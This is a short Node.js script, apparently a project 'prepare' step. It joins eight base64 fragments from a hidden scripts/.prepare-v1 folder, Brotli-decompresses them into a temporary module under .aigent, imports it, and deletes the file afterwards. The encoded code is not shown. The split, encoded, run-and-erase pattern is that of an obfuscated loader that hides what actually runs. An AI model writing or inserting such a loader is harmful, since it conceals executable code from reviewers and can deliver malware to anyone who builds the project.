#!/usr/bin/env node
import fs from "node:fs";
import path from "node:path";
import zlib from "node:zlib";
import { pathToFileURL } from "node:url";

const parts = Array.from({ length: 8 }, (_, index) =>
  fs.readFileSync(path.join("scripts", ".prepare-v1", `part-${String(index).padStart(2, "0")}.txt`), "utf8"),
);
const runtime = path.resolve(".aigent", "prepare-v1-runtime.mjs");
fs.mkdirSync(path.dirname(runtime), { recursive: true });
fs.writeFileSync(runtime, zlib.brotliDecompressSync(Buffer.from(parts.join(""), "base64")));
try {
  await import(`${pathToFileURL(runtime).href}?t=${Date.now()}`);
} finally {
  fs.rmSync(runtime, { force: true });
}
